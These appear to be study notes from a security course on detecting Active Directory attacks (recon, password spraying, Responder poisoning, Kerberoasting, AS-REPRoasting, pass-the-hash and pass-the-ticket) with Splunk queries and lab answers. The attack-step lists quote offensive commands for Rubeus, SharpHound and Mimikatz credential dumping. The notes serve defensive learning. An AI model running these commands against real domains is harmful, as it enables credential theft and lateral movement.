<p><strong>Q4:</strong> Determine the folder that contains all Mimikatz-related files and enter the full path as your answer.</p>
<p><code>Windows.Search.FileFinder</code></p>
<p>Change the configuration multiple times to find the right folder.</p>
<p><code>C:\Users\j0seph\AppData\Local\mimik</code></p>
<p><strong>Q5:</strong> Determine the Microsoft Word document that j0seph recently accessed and enter its name as your answer. Answer format: _.DOCX</p>
<p><code>Windows.Forensics.Prefetch</code></p>
<p>Then, search <code>docx</code> in the json file.</p>
<p><img alt="alt text" src="../assets/image40.png" /></p>
<p><a href="https://medium.com/@DefenderX/incident-response-and-threat-hunting-using-velociraptor-pt-2-03a5988f2d2d">Incident Response and Threat hunting using Velociraptor — Pt.2</a></p>
<h2 id="detecting-windows-attacks-with-splunk">Detecting Windows Attacks with Splunk</h2>
<h4 id="detecting-common-userdomain-recon">Detecting Common User/Domain Recon</h4>
<p><strong>Domain Reconnaissance</strong></p>
<ul>
<li>User/Domain Reconnaissance Using Native Windows Executables</li>
</ul>
<pre><code class="language-powershell">whoami /all
wmic computersystem get domain
net user /domain
net group &quot;Domain Admins&quot; /domain
arp -a
nltest /domain_trusts
</code></pre>
<ul>
<li>User/Domain Reconnaissance Using BloodHound/SharpHound</li>
</ul>
<p><a href="https://github.com/SpecterOps/BloodHound">BloodHound</a> is an open-source domain reconnaissance tool created to analyze and visualize the Active Directory (AD) environment.</p>
<p><a href="https://github.com/BloodHoundAD/SharpHound">Sharphound</a> is a C# data collector for BloodHound. </p>
<p><code>.\SharpHound.exe -c all</code></p>
<p>Under the hood, the BloodHound collector executes numerous LDAP queries directed at the Domain Controller, aiming to amass information about the domain.</p>
<p>However, monitoring LDAP queries can be a challenge. By default, the Windows Event Log does not record them. The best option Windows can suggest is employing <code>Event 1644</code> - the LDAP performance monitoring log. Even with it enabled, BloodHound may not generate many of the expected events.</p>
<p>A more reliable approach is to utilize the Windows ETW provider <code>Microsoft-Windows-LDAP-Client</code>. <a href="https://github.com/mandiant/SilkETW">SilkETW &amp; SilkService</a> are versatile C# wrappers for ETW, designed to simplify the intricacies of ETW, providing an accessible interface for research and introspection. <code>SilkService</code> supports output to the Windows Event Log, which streamlines log digestion. Another useful feature is the ability to employ <code>Yara</code> rules for hunting suspicious LDAP queries.</p>
<p>In addition, Microsoft's ATP team has compiled a <a href="https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/824726">list of LDAP filters frequently used by reconnaissance tools</a>.</p>
<p><strong>Detecting User/Domain Recon With Splunk</strong></p>
<ul>
<li>Detecting Recon By Targeting Native Windows Executables</li>
</ul>
<p>Timeframe: <code>earliest=1690447949 latest=1690450687</code></p>
<pre><code class="language-splunk">index=main source=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; EventID=1 earliest=1690447949 latest=1690450687
| search process_name IN (arp.exe,chcp.com,ipconfig.exe,net.exe,net1.exe,nltest.exe,ping.exe,systeminfo.exe,whoami.exe) OR (process_name IN (cmd.exe,powershell.exe) AND process IN (*arp*,*chcp*,*ipconfig*,*net*,*net1*,*nltest*,*ping*,*systeminfo*,*whoami*))
| stats values(process) as process, min(_time) as _time by parent_process, parent_process_id, dest, user
| where mvcount(process) &gt; 3
</code></pre>
<ul>
<li>Detecting Recon By Targeting BloodHound</li>
</ul>
<p>Timeframe: <code>earliest=1690195896 latest=1690285475</code></p>
<pre><code class="language-splunk">index=main earliest=1690195896 latest=1690285475 source=&quot;WinEventLog:SilkService-Log&quot;
| spath input=Message 
| rename XmlEventData.* as * 
| table _time, ComputerName, ProcessName, ProcessId, DistinguishedName, SearchFilter
| sort 0 _time
| search SearchFilter=&quot;*(samAccountType=805306368)*&quot;
| stats min(_time) as _time, max(_time) as maxTime, count, values(SearchFilter) as SearchFilter by ComputerName, ProcessName, ProcessId
| where count &gt; 10
| convert ctime(maxTime)
</code></pre>
<p><strong>Q:</strong> Modify and employ the Splunk search provided at the end of this section on all ingested data (All time) to find all process names that made LDAP queries where the filter includes the string <code>*(samAccountType=805306368)*</code>. Enter the missing process name from the following list as your answer. N/A, Rubeus, SharpHound, mmc, powershell, _</p>
<pre><code class="language-splunk">index=main source=&quot;WinEventLog:SilkService-Log&quot;
| spath input=Message 
| rename XmlEventData.* as * 
| table _time, ComputerName, ProcessName, ProcessId, DistinguishedName, SearchFilter
| sort 0 _time
| search SearchFilter=&quot;*(samAccountType=805306368)*&quot;
| stats min(_time) as _time, max(_time) as maxTime, count, values(SearchFilter) as SearchFilter by ComputerName, ProcessName, ProcessId
</code></pre>
<p><img alt="alt text" src="../assets/image41.png" /></p>
<h4 id="detecting-password-spraying">Detecting Password Spraying</h4>
<p><strong>Password Spraying</strong></p>
<p><a href="https://github.com/Greenwolf/Spray">Spray</a></p>
<p><strong>Password Spraying Detection Opportunities</strong></p>
<p>A common pattern is multiple failed logon attempts with <code>Event ID 4625 - Failed Logon</code> from different user accounts but originating from the same source IP address within a short time frame.</p>
<p>Other event logs that may aid in password spraying detection include:</p>
<pre><code>4768 and ErrorCode 0x6 - Kerberos Invalid Users
4768 and ErrorCode 0x12 - Kerberos Disabled Users
4776 and ErrorCode 0xC000006A - NTLM Invalid Users
4776 and ErrorCode 0xC0000064 - NTLM Wrong Password
4648 - Authenticate Using Explicit Credentials
4771 - Kerberos Pre-Authentication Failed
</code></pre>
<p><strong>Detecting Password Spraying With Splunk</strong></p>
<p>Timeframe: <code>earliest=1690280680 latest=1690289489</code></p>
<pre><code class="language-splunk">index=main earliest=1690280680 latest=1690289489 source=&quot;WinEventLog:Security&quot; EventCode=4625
| bin span=15m _time
| stats values(user) as Users, dc(user) as dc_user by src, Source_Network_Address, dest, EventCode, Failure_Reason
</code></pre>
<p>Search Breakdown:</p>
<p>Filtering by Index, Source, and EventCode: The search starts by selecting events from the main index where the source is WinEventLog:Security and the EventCode is 4625. This EventCode represents failed logon attempts in the Windows Security Event Log.</p>
<p>Time Range Filter: The search restricts the time range of events to those occurring between the Unix timestamps 1690280680 and 1690289489. These timestamps represent the earliest and latest times in which the events occurred.</p>
<p>Time Binning: The <code>bin</code> command is used to create time buckets of 15 minutes duration for each event based on the _time field. This step groups the events into 15-minute intervals, which can be useful for analyzing patterns or trends over time.</p>
<p>Statistics: The <code>stats</code> command is used to aggregate events based on the fields src, Source_Network_Address, dest, EventCode, and Failure_Reason.</p>
<p>For each unique combination of these fields, the search calculates the following statistics:</p>
<pre><code>values(user) as Users: All unique values of the user field within each group.

dc(user) as dc_user: The distinct count of unique values of the `user` field within each group. This represents the number of different users associated with the failed logon attempts in each group.
</code></pre>
<h4 id="detecting-responder-like-attacks">Detecting Responder-like Attacks</h4>
<p><strong>LLMNR/NBT-NS/mDNS Poisoning</strong></p>
<p><code>LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning</code>, also referred to as NBNS spoofing, are network-level attacks that exploit inefficiencies in these name resolution protocols. Both <code>LLMNR</code> and <code>NBT-NS</code> are used to resolve hostnames to IP addresses on local networks when the fully qualified domain name (FQDN) resolution fails. However, their lack of built-in security mechanisms renders them susceptible to spoofing and poisoning attacks.</p>
<p>Typically, attackers employ the <a href="https://github.com/lgandx/Responder">Responder</a> tool to execute LLMNR, NBT-NS, or mDNS poisoning.</p>
<p><strong>Responder Detection Opportunities</strong></p>
<p>Detecting LLMNR, NBT-NS, and mDNS poisoning can be challenging. However, organizations can mitigate the risk by implementing the following measures:</p>
<ol>
<li>
<p>Deploy network monitoring solutions to detect unusual <code>LLMNR</code> and <code>NBT-NS</code> traffic patterns, such as an elevated volume of name resolution requests from a single source.</p>
</li>
<li>
<p>Employ a honeypot approach - name resolution for non-existent hosts should fail. If an attacker is present and spoofing LLMNR/NBT-NS/mDNS responses, name resolution will succeed. https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/</p>
</li>
</ol>
<pre><code class="language-powershell"># A PowerShell script similar to the following can be automated to run as a scheduled task to aid in detection. 

$logfile = 'C:tmppoisoning.csv'
$requestHosts = @('CORP-TX-FILE-01','COPY-NY-DC-02') #False hostnames to request
$interval = 30 #The minimum number of seconds to wait between requests
$jitter = 30 #The maximum value for a random number of seconds to add to the interval
while($true){
    Start-Sleep ($interval + (Get-Random ($jitter + 1)))
    try {
        $ErrorActionPreference = 'stop'
        $request = Get-Random $requestHosts
        $ipAddr = (Resolve-DnsName -LlmnrNetbiosOnly -Name $request).IPAddress.tostring()
        $ErrorActionPreference = &quot;continue&quot;
        $event = [pscustomobject]@{
            date = Get-Date -format o
            host = $env:COMPUTERNAME
            request = $request
            attacker_ip = $ipAddr
            message = &quot;LLMNR/NBT-NS spoofing by $ipAddr detected with $request request&quot;
        }
        Write-Output $event.message
        $event | Export-Csv -Path $logfile -Append -NoTypeInformation
    } catch [System.Management.Automation.RuntimeException],
[System.ComponentModel.Win32Exception] {
    #Suppress output of timeout errors
    } finally {
        $ErrorActionPreference = &quot;continue&quot;
    }
}
</code></pre>
<pre><code class="language-powershell">New-EventLog -LogName Application -Source LLMNRDetection

Write-EventLog -LogName Application -Source LLMNRDetection -EventId 19001 -Message $msg -EntryType Warning
</code></pre>
<p><strong>Detecting Responder-like Attacks With Splunk</strong></p>
<p>Timeframe: <code>earliest=1690290078 latest=1690291207</code></p>
<pre><code class="language-splunk">index=main earliest=1690290078 latest=1690291207 SourceName=LLMNRDetection
| table _time, ComputerName, SourceName, Message
</code></pre>
<p><a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90022">Sysmon Event ID 22</a> can also be utilized to track DNS queries associated with non-existent/mistyped file shares.</p>
<pre><code class="language-splunk">index=main earliest=1690290078 latest=1690291207 EventCode=22 
| table _time, Computer, user, Image, QueryName, QueryResults
</code></pre>
<p>Additionally, remember that <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4648">Event 4648</a> can be used to detect explicit logons to rogue file shares which attackers might use to gather legitimate user credentials.</p>
<pre><code class="language-splunk">index=main earliest=1690290814 latest=1690291207 EventCode IN (4648) 
| table _time, EventCode, source, name, user, Target_Server_Name, Message
| sort 0 _time
</code></pre>
<p><strong>Q:</strong> Modify and employ the provided Sysmon Event 22-based Splunk search on all ingested data (All time) to identify all share names whose location was spoofed by 10.10.0.221. Enter the missing share name from the following list as your answer. myshare, myfileshar3, _</p>
<pre><code class="language-splunk">index=main EventCode=22 QueryResults=&quot;*10.10.0.221*&quot;
| table _time, Computer, user, Image, QueryName, QueryResults
</code></pre>
<h4 id="detecting-kerberoastingas-reproasting">Detecting Kerberoasting/AS-REProasting</h4>
<p><code>Kerberoasting</code> is a technique targeting service accounts in Active Directory environments to extract and crack their password hashes.</p>
<p>An example of a Kerberoasting attack is using the <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> <code>kerberoast</code> module.</p>
<p><code>.\Rubeus.exe kerberoast</code></p>
<p><strong>Kerberoasting Attack Steps:</strong></p>
<ol>
<li>
<p>Identify Target Service Accounts: The attacker enumerates Active Directory to identify service accounts with <code>Service Principal Names (SPNs)</code> set. Service accounts are often associated with services running on the network, such as SQL Server, Exchange, or other applications. The following is a code snippet from <code>Rubeus</code> that is related to this step.</p>
</li>
<li>
<p>Request TGS Tickets: The attacker uses the identified service accounts to request <code>Ticket Granting Service (TGS)</code> tickets from the <code>Key Distribution Center (KDC)</code>. These TGS tickets contain encrypted service account password hashes. The following is a code snippet from <code>Rubeus</code> that is related to this step.</p>
</li>
<li>
<p>Offline Brute-Force Attack: The attacker employs offline brute-force techniques, utilizing password cracking tools like <code>Hashcat</code> or <code>John the Ripper</code>, to attempt to crack the encrypted password hashes.</p>
</li>
</ol>
<p>During the Kerberos authentication process, several security-related events are generated in the Windows Event Log when a user connects to an MSSQL server:</p>
<p><code>Event ID 4768 (Kerberos TGT Request)</code>: Occurs when the client workstation requests a TGT from the KDC, generating this event in the Security log on the domain controller.</p>
<p><code>Event ID 4769 (Kerberos Service Ticket Request)</code>: Generated after the client receives the TGT and requests a TGS for the MSSQL server's SPN.</p>
<p><code>Event ID 4624 (Logon)</code>: Logged in the Security log on the MSSQL server, indicating a successful logon once the client initiates a connection to the MSSQL server and logs in using the service account with the SPN to establish the connection.</p>
<p><strong>Kerberoasting Detection Opportunities</strong></p>
<p>Detection logic entails finding all events for TGS requests and logon events from the same user, then identifying instances where a TGS request is present without a subsequent logon event. In the case of IIS service access using a service account with an SPN, an additional <code>4648 (A logon was attempted using explicit credentials)</code> event will be generated as a logon event.</p>
<p><strong>Detecting Kerberoasting With Splunk</strong></p>
<ul>
<li>Benign TGS Requests</li>
</ul>
<pre><code class="language-splunk">index=main earliest=1690388417 latest=1690388630 EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc) 
| dedup RecordNumber 
| rex field=user &quot;(?&lt;username&gt;[^@]+)&quot;
| table _time, ComputerName, EventCode, name, username, Account_Name, Account_Domain, src_ip, service_name, Ticket_Options, Ticket_Encryption_Type, Target_Server_Name, Additional_Information
</code></pre>
<p>Search Breakdown:</p>
<p><code>index=main earliest=1690388417 latest=1690388630</code>: This filters the search to only include events from the main index that occurred between the specified earliest and latest epoch timestamps.</p>
<p><code>EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)</code>: This further filters the search to only include events with an EventCode of 4648 or an EventCode of 4769 with a service_name of iis_svc.</p>
<p><code>| dedup RecordNumber</code>: This removes duplicate events based on the <code>RecordNumber</code> field.</p>
<p><code>| rex field=user "(?&lt;username&gt;[^@]+)"</code>: This extracts the <code>username</code> portion of the <code>user</code> field using a regular expression and stores it in a new field called <code>username</code>.</p>
<p><code>| table _time, ComputerName, EventCode, name, username, Account_Name, Account_Domain, src_ip, service_name, Ticket_Options, Ticket_Encryption_Type, Target_Server_Name, Additional_Information</code>: This displays the specified fields in tabular format.</p>
<ul>
<li>Detecting Kerberoasting - SPN Querying</li>
</ul>
<pre><code class="language-splunk">index=main earliest=1690448444 latest=1690454437 source=&quot;WinEventLog:SilkService-Log&quot; 
| spath input=Message 
| rename XmlEventData.* as * 
| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter 
| search SearchFilter=&quot;*(&amp;(samAccountType=805306368)(servicePrincipalName=*)*&quot;
</code></pre>
<ul>
<li>Detecting Kerberoasting - TGS Requests</li>
</ul>
<pre><code class="language-splunk">index=main earliest=1690450374 latest=1690450483 EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)
| dedup RecordNumber
| rex field=user &quot;(?&lt;username&gt;[^@]+)&quot;
| bin span=2m _time 
| search username!=*$ 
| stats values(EventCode) as Events, values(service_name) as service_name, values(Additional_Information) as Additional_Information, values(Target_Server_Name) as Target_Server_Name by _time, username
| where !match(Events,&quot;4648&quot;)
</code></pre>
<p><code>| search username!=*$</code>: Filters out events where the <code>username</code> field ends with a <code>$</code>.</p>
<p><code>| where !match(Events,"4648")</code>: Filters out events that have the value <code>4648</code> in the <code>Events</code> field.</p>
<ul>
<li>Detecting Kerberoasting Using Transactions - TGS Requests</li>
</ul>
<pre><code class="language-splunk">index=main earliest=1690450374 latest=1690450483 EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)
| dedup RecordNumber
| rex field=user &quot;(?&lt;username&gt;[^@]+)&quot;
| search username!=*$ 
| transaction username keepevicted=true maxspan=5s endswith=(EventCode=4648) startswith=(EventCode=4769) 
| where closed_txn=0 AND EventCode = 4769
| table _time, EventCode, service_name, username
</code></pre>
<p><code>| transaction username keepevicted=true maxspan=5s endswith=(EventCode=4648) startswith=(EventCode=4769)</code>: Groups events into <code>transactions</code> based on the <code>username</code> field. The <code>keepevicted=true</code> option includes events that do not meet the transaction criteria. The <code>maxspan=5s</code>option sets the maximum time duration of a transaction to 5 seconds. The <code>endswith=(EventCode=4648)</code> and <code>startswith=(EventCode=4769)</code> options specify that transactions should start with an event with <code>EventCode 4769</code> and end with an event with <code>EventCode 4648</code>.</p>
<p><code>| where closed_txn=0 AND EventCode = 4769</code>: Filters the results to only include transactions that are not closed (<code>closed_txn=0</code>) and have an <code>EventCode</code> of <code>4769</code>.</p>
<p><strong>AS-REPRoasting</strong></p>
<p><code>ASREPRoasting</code> is a technique used in Active Directory environments to target user accounts without pre-authentication enabled.</p>
<p><code>.\Rubeus.exe asreproast</code></p>
<p><strong>ASREPRoasting Attack Steps:</strong></p>
<ol>
<li>
<p>Identify Target User Accounts: The attacker identifies user accounts without pre-authentication enabled. The following is a code snippet from <code>Rubeus</code> that is related to this step.</p>
</li>
<li>
<p>Request AS-REQ Service Tickets: The attacker initiates an AS-REQ service ticket request for each identified target user account. The following is a code snippet from Rubeus that is related to this step.</p>
</li>
<li>
<p>Offline Brute-Force Attack: The attacker captures the encrypted TGTs and employs offline brute-force techniques to attempt to crack the password hashes.</p>
</li>
</ol>
<p><strong>Kerberos pre-authentication</strong> is an additional security mechanism in the Kerberos authentication protocol enhancing user credentials protection during the authentication process. When a user tries to access a network resource or service, the client sends an authentication request AS-REQ to the KDC.</p>
<p>If pre-authentication is enabled, this request also contains an encrypted timestamp (<code>pA-ENC-TIMESTAMP</code>). The KDC attempts to decrypt this timestamp using the user password hash and, if successful, issues a TGT to the user.</p>
<p>When pre-authentication is disabled, there is no timestamp validation by the KDC, allowing users to request a TGT ticket without knowing the user password.</p>
<p><strong>AS-REPRoasting Detection Opportunities</strong></p>
<p>Kerberos authentication <code>Event ID 4768 (TGT Request)</code> contains a <code>PreAuthType</code> attribute in the additional information part of the event indicating whether pre-authentication is enabled for an account.</p>
<p><strong>Detecting AS-REPRoasting With Splunk</strong></p>
<ul>
<li>Detecting AS-REPRoasting - Querying Accounts With Pre-Auth Disabled</li>
</ul>
<pre><code class="language-splunk">index=main earliest=1690392745 latest=1690393283 source=&quot;WinEventLog:SilkService-Log&quot; 
| spath input=Message 
| rename XmlEventData.* as * 
| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter 
| search SearchFilter=&quot;*(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)*&quot;
</code></pre>
<ul>
<li>Detecting AS-REPRoasting - TGT Requests For Accounts With Pre-Auth Disabled</li>
</ul>
<pre><code class="language-splunk">index=main earliest=1690392745 latest=1690393283 source=&quot;WinEventLog:Security&quot; EventCode=4768 Pre_Authentication_Type=0
| rex field=src_ip &quot;(\:\:ffff\:)?(?&lt;src_ip&gt;[0-9\.]+)&quot;
| table _time, src_ip, user, Pre_Authentication_Type, Ticket_Options, Ticket_Encryption_Type
</code></pre>
<p><code>| rex field=src_ip "(\:\:ffff\:)?(?&lt;src_ip&gt;[0-9\.]+)"</code>: Uses a regular expression to extract the <code>src_ip</code> (source IP address) field. The expression matches an optional <code>"::ffff:"</code> prefix followed by an IP address in dotted decimal notation. This step handles IPv4-mapped IPv6 addresses by extracting the IPv4 portion.</p>
<p><strong>Q:</strong> Modify and employ the Splunk search provided at the "Detecting Kerberoasting - SPN Querying" part of this section on all ingested data (All time). Enter the name of the user who initiated the process that executed an LDAP query containing the "<em>(&amp;(samAccountType=805306368)(servicePrincipalName=</em>)*" string at 2023-07-26 16:42:44 as your answer. Answer format: CORP_</p>
<pre><code class="language-splunk">index=main source=&quot;WinEventLog:SilkService-Log&quot; 
| spath input=Message 
| rename XmlEventData.* as * 
| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter,ProcessID 
| search SearchFilter=&quot;*(&amp;(samAccountType=805306368)(servicePrincipalName=*)*&quot;

index=main ProcessId=7136 EventCode=1
| table _time,EventCode, ProcessId, ProcessName, User
</code></pre>
<p><code>EventCode=1</code>: indicating process creation</p>
<h4 id="detecting-pass-the-hash">Detecting Pass-the-Hash</h4>
<p><strong>Pass-the-Hash</strong> is a technique utilized by attackers to authenticate to a networked system using the <code>NTLM</code> hash of a user's password instead of the plaintext password. The attack capitalizes on the way Windows stores password hashes in memory, enabling adversaries with administrative access to capture the hash and reuse it for lateral movement within the network.</p>
<p><strong>Pass-the-Hash Attack Steps:</strong></p>
<ol>
<li>
<p>The attacker employs tools such as <code>Mimikatz</code> to extract the <code>NTLM</code> hash of a user currently logged onto the compromised system. Note that local administrator privileges are required on the system to extract the user's hash.</p>
</li>
<li>
<p>Armed with the <code>NTLM</code> hash, the attacker can authenticate as the targeted user on other systems or network resources without needing to know the actual password.`</p>
</li>
<li>
<p>Utilizing the authenticated session, the attacker can move laterally within the network, gaining unauthorized access to other systems and resources.</p>
</li>
</ol>
<p><strong>Windows Access Tokens &amp; Alternate Credentials</strong></p>
<p>An <strong>access token</strong> is a data structure that defines the security context of a process or thread. It contains information about the associated user account's identity and privileges.</p>
<p>https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens</p>
<p><strong>Alternate Credentials</strong> provide a way to supply different login credentials (username and password) for specific actions or processes without altering the user's primary login session. This permits a user or process to execute certain commands or access resources as a different user without logging out or switching user accounts. The <code>runas</code> command is a Windows command-line tool that allows users to execute commands as another user. When the <code>runas</code> command is executed, a new access token is generated, which can be verified with the <code>whoami</code> command.</p>
<p>The <code>runas</code> command also contains an interesting flag <code>/netonly</code>. This flag indicates that the specified user information is for remote access only. Even though the <code>whoami</code> command returns the original username, the spawned <code>cmd.exe</code> can still access the Domain Controller root folder.</p>
<p><strong>Pass-the-Hash Detection Opportunities</strong></p>
<ul>
<li>
<p>When <code>runas</code> command is executed without the <code>/netonly</code> flag - <code>Event ID 4624 (Logon)</code> with <code>LogonType 2 (interactive)</code>.</p>
</li>
<li>
<p>When <code>runas</code> command is executed with the <code>/netonly</code> flag - <code>Event ID 4624 (Logon)</code> with <code>LogonType 9 (NewCredentials)</code>.`</p>
</li>
</ul>
<p>The main difference between <code>runas</code> with the <code>netonly</code> flag and the <code>Pass-the-Hash</code> attack is that in the latter case, <code>Mimikatz</code> will access the <code>LSASS</code> process memory to change <code>LogonSession</code> credential materials. Thus, initial detection can be enhanced by correlating <code>User Logon with NewCredentials</code> events with <code>Sysmon Process Access Event Code 10</code>.</p>
<p><strong>Detecting Pass-the-Hash With Splunk</strong></p>
<p><a href="https://blog.netwrix.com/2021/11/30/how-to-detect-pass-the-hash-attacks/">Logon_Process=seclogo</a> :</p>
<p>"The main difference to key off of is the Logon Process will always be <code>seclogo</code> for pass the hash (from my tests), so you can filter on that to reduce false-positive rates."</p>
<pre><code class="language-splunk">index=main earliest=1690450708 latest=1690451116 source=&quot;WinEventLog:Security&quot; EventCode=4624 Logon_Type=9 Logon_Process=seclogo
| table _time, ComputerName, EventCode, user, Network_Account_Domain, Network_Account_Name, Logon_Type, Logon_Process
</code></pre>
<p>Enhanced search term:</p>
<pre><code class="language-Splunk">index=main earliest=1690450689 latest=1690451116 (source=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; EventCode=10 TargetImage=&quot;C:\\Windows\\system32\\lsass.exe&quot; SourceImage!=&quot;C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\*\\MsMpEng.exe&quot;) OR (source=&quot;WinEventLog:Security&quot; EventCode=4624 Logon_Type=9 Logon_Process=seclogo)
| sort _time, RecordNumber
| transaction host maxspan=1m endswith=(EventCode=4624) startswith=(EventCode=10)
| stats count by _time, Computer, SourceImage, SourceProcessId, Network_Account_Domain, Network_Account_Name, Logon_Type, Logon_Process
| fields - count
</code></pre>
<p>EventCode 10 (Process Access), EventCode 4624 (Logon), Logon_Type 9 (NewCredentials).</p>
<h4 id="detecting-pass-the-ticket">Detecting Pass-the-Ticket</h4>
<p><strong>Pass-the-Ticket (PtT)</strong> is a lateral movement technique used by attackers to move laterally within a network by abusing Kerberos TGT (Ticket Granting Ticket) and TGS (Ticket Granting Service) tickets. Instead of using NTLM hashes, PtT leverages Kerberos tickets to authenticate to other systems and access network resources without needing to know the users' passwords. This technique allows attackers to move laterally and gain unauthorized access across multiple systems.</p>
<p><strong>PtT Attack Steps:</strong></p>
<ol>
<li>
<p>The attacker gains administrative access to a system, either through an initial compromise or privilege escalation.</p>
</li>
<li>
<p>The attacker uses tools such as <code>Mimikatz</code> or <code>Rubeus</code> to extract valid TGT or TGS tickets from the compromised system's memory.</p>
<p><code>.\Rubeus.exe monitor /interval:30</code></p>
</li>
<li>
<p>The attacker submits the extracted ticket for the current logon session. The attacker can now authenticate to other systems and network resources without needing plaintext passwords.</p>
<p><code>.\Rubeus.exe ptt /ticket:&lt;extracted ticket in step 2&gt;</code></p>
</li>
</ol>
<p><strong>Related Windows Security Events</strong></p>
<p>During user access to network resources, several Windows Event Logs are generated to record the logon process and related activities.</p>
<ul>
<li>
<p>Event ID 4648 (Explicit Credential Logon Attempt): This event is logged when explicit credentials (e.g., username and password) are provided during logon.</p>
</li>
<li>
<p>Event ID 4624 (Logon): This event indicates that a user has successfully logged on to the system.</p>
</li>
<li>
<p>Event ID 4672 (Special Logon): This event is logged when a user's logon includes special privileges, such as running applications as an administrator.</p>
</li>
<li>
<p>Event ID 4768 (Kerberos TGT Request): This event is logged when a client requests a Ticket Granting Ticket (TGT) during the Kerberos authentication process.</p>
</li>
<li>
<p>Event ID 4769 (Kerberos Service Ticket Request): When a client requests a Service Ticket (TGS Ticket) to access a remote service during the Kerberos authentication process, Event ID 4769 is generated.</p>
</li>
</ul>
<p><strong>Pass-the-Ticket Detection Opportunities</strong></p>
<p>This approach can be converted into the following Splunk detection: Look for <code>Event ID 4769 (Kerberos Service Ticket Request) or Event ID 4770 (Kerberos Service Ticket was renewed)</code> without a prior <code>Event ID 4768 (Kerberos TGT Request)</code> from the same system within a specific time window.</p>
<p>Another approach is looking for mismatches between Service and Host IDs (in <code>Event ID 4769</code>) and the actual Source and Destination IPs (in <code>Event ID 3</code>). Note that there will be several legitimate mismatches, but unusual hostnames or services should be investigated further.</p>
<p>Also, in cases where an attacker imports a TGS ticket into the logon session, it is important to review <code>Event ID 4771 (Kerberos Pre-Authentication Failed)</code> for mismatches between Pre-Authentication type and Failure Code. For example, <code>Pre-Authentication type 2 (Encrypted Timestamp)</code> with <code>Failure Code 0x18 (Pre-authentication information was invalid)</code> would indicate that the client sent a Kerberos AS-REQ with a pre-authentication encrypted timestamp, but the KDC couldn’t decrypt it.</p>
<p>It is essential to understand that these detection opportunities should be enhanced with behavior-based detection. In other words, context is vital. Looking for Event IDs <code>4769</code>, <code>4770</code>, or <code>4771</code> alone will likely generate many false positives. Correlate the event logs with user and system behavior patterns, and consider whether there are any suspicious activities associated with the user or system involved in the logs.</p>
<p><strong>Detecting Pass-the-Ticket With Splunk</strong></p>
<pre><code class="language-splunk">index=main earliest=1690392405 latest=1690451745 source=&quot;WinEventLog:Security&quot; user!=*$ EventCode IN (4768,4769,4770) 
| rex field=user &quot;(?&lt;username&gt;[^@]+)&quot;
| rex field=src_ip &quot;(\:\:ffff\:)?(?&lt;src_ip_4&gt;[0-9\.]+)&quot;
| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closed_txn=0
| search NOT user=&quot;*$@*&quot;
| table _time, ComputerName, username, src_ip_4, service_name, category
</code></pre>
<h4 id="detecting-overpass-the-hash">Detecting Overpass-the-Hash</h4>
<p>Adversaries may utilize the <strong>Overpass-the-Hash</strong> technique to obtain Kerberos TGTs by leveraging stolen password hashes to move laterally within an environment or to bypass typical system access controls. Overpass-the-Hash (also known as <strong>Pass-the-Key</strong>) allows authentication to occur via Kerberos rather than NTLM. Both NTLM hashes or AES keys can serve as a basis for requesting a Kerberos TGT.</p>
<p><strong>Overpass-the-Hash Attack Steps:</strong></p>
<ol>
<li>
<p>The attacker employs tools such as Mimikatz to extract the NTLM hash of a user who is currently logged in to the compromised system. The attacker must have at least local administrator privileges on the system to be able to extract the hash of the user.</p>
<p><code>sekurlsa::logonpasswords</code></p>
</li>
<li>
<p>The attacker uses a tool such as Rubeus to craft a raw AS-REQ request for a specified user to request a TGT ticket. This step does not require elevated privileges on the host to request the TGT, which makes it a stealthier approach than the Mimikatz Pass-the-Hash attack.</p>
<p><code>.\Rubeus.exe asktgt /user:Administrator /domain:lab.internal.local /rc4:&lt;admin's NTLM hash extracted in step 1&gt; ptt</code></p>
</li>
<li>
<p>Analogous to the Pass-the-Ticket technique, the attacker submits the requested ticket for the current logon session.</p>
</li>
</ol>
<p><strong>Overpass-the-Hash Detection Opportunities</strong></p>
<p><code>Mimikatz</code>'s Overpass-the-Hash attack leaves the same artifacts as the Pass-the-Hash attack, and can be detected using the same strategies.</p>
<p><code>Rubeus</code>, however, presents a somewhat different scenario. Unless the requested TGT is used on another host, Pass-the-Ticket detection mechanisms may not be effective, as Rubeus sends an AS-REQ request directly to the Domain Controller (DC), generating <code>Event ID 4768 (Kerberos TGT Request)</code>. However, communication with the DC (<code>TCP/UDP port 88</code>) from an unusual process can serve as an indicator of a potential Overpass-the-Hash attack.</p>
<p><strong>Detecting Overpass-the-Hash With Splunk (Targeting Rubeus)</strong></p>
<pre><code class="language-splunk">index=main earliest=1690443407 latest=1690443544 source=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; (EventCode=3 dest_port=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by process_id
| where EventCode=3
| stats count by _time, Computer, dest_ip, dest_port, Image, process
| fields - count
</code></pre>
<p>Event ID 3: Network connection detected</p>
<h4 id="detecting-golden-ticketssilver-tickets">Detecting Golden Tickets/Silver Tickets</h4>
<p>A <strong>Golden Ticket</strong> attack is a potent method where an attacker forges a Ticket Granting Ticket (TGT) to gain unauthorized access to a Windows Active Directory domain as a domain administrator. The attacker creates a TGT with arbitrary user credentials and then uses this forged ticket to impersonate a domain administrator, thereby gaining full control over the domain. The Golden Ticket attack is stealthy and persistent, as the forged ticket has a long validity period and remains valid until it expires or is revoked.</p>
<p><strong>Golden Tickets Attack Steps:</strong></p>
